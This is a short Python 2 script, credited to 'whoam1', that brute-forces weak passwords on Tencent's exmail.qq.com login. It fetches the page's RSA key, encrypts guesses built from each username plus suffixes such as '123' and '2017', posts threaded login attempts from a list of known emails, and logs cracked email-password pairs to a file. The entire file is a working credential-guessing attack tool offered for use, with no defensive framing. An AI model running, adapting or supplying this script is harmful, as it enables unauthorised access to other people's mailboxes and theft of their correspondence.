#
# author : whoam1
# 
# blog   : http://www.cnnetarmy.com
#
# Use for brute exmail.qq.com week password.

import requests
import re
import rsa
import base64
import time
import random
import threading

def brute(email,password,UA):
	url = 'https://en.exmail.qq.com'
	headers ={
	'Connection': 'keep-alive','Cache-Control': 'max-age=0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Upgrade-Insecure-Requests': '1','DNT': '1',
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',
	'Accept-Encoding': 'gzip, deflate, sdch',
	'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4'}
	s = requests.Session()
	req = s.get(url,headers=headers)
	public_key = re.findall(r'var PublicKey = "(.*?)";',req.content)[0]
	ts= re.findall(r'var PublicTs="(.*?)";',req.content)[0]
	public_key = rsa.PublicKey(int(public_key, 16), 65537)
	res_tmp = rsa.encrypt('{password}\n{ts}\n'.format(password=password, ts=ts), public_key)
	p = base64.b64encode(res_tmp)
	uin = email.split('@')[0]
	domain = email.split('@')[1]
	post_data = {}
	post_data['sid'] = ''
	post_data['firstlogin'] = False
	post_data['domain'] = domain
	post_data['aliastype'] = 'other'
	post_data['errtemplate'] = 'dm_loginpage'
	post_data['first_step'] = ''
	post_data['buy_amount'] = ''
	post_data['year'] = ''
	post_data['company_name'] = ''
	post_data['is_get_dp_coupon'] = ''
	post_data['starttime'] = int(time.time() * 1000)
	post_data['redirecturl'] = ''
	post_data['f'] = 'biz'
	post_data['uin'] = uin
	post_data['p'] = p
	post_data['delegate_url'] = ''
	post_data['ts'] = ts
	post_data['from'] = ''
	post_data['ppp'] = ''
	post_data['chg'] = 0
	post_data['loginentry'] = 3
	post_data['s'] = ''
	post_data['dmtype'] = ''
	post_data['fun'] = ''
	post_data['inputuin'] = email
	post_data['verifycode'] = ''
	headers = {'Content-Type': 'application/x-www-form-urlencoded',"User-Agent": UA}
	login_url = 'https://en.exmail.qq.com/cgi-bin/login'
	print '[*] Now is trying...email:%s' % email
	try:
		resp = s.post(url=login_url, headers=headers, data=post_data)
		#根据是否绑定微信判定
		if 'var target=\"\"'  in resp.content or 'loginpage?nocheckframe=true' in resp.content:
			print '[!] OK! Get email:%s,password:%s' % (email,password)
			with open('brute_ok.txt','a')as flag:
				flag.write(email)
				flag.write(' : ')
				flag.write(password)
				flag.write('\n')
	except:
		pass
	#s.cookies.clear()
	#post_data.clear()

def main():
	u = open('user-agents.txt','r')
	useragent = []
	for ua in u.readlines():
		uat = ua.strip()
		useragent.append(uat)
	UA = random.choice(useragent)
	'''
	user = ''
	pwd = ''
	brute(user,pwd,UA)
	'''
	tsk = []
	pwd_list = ['%pwd%123','%pwd%521','%pwd%@123','%pwd%1024','%pwd%2017']
	f = open('known_all_emails.txt','r')
	for i in f.readlines():
		user = i.strip()
		p =  i.split('@')[0].strip().capitalize()
		for j in pwd_list:
			pwd = j.replace('%pwd%',p)
			#brute(user,pwd,UA)
			t = threading.Thread(target = brute,args = (user,pwd,UA))
			tsk.append(t)
	for t in tsk:
		t.start()
		t.join()#阻塞(0.1)


if __name__ == '__main__':
	main()
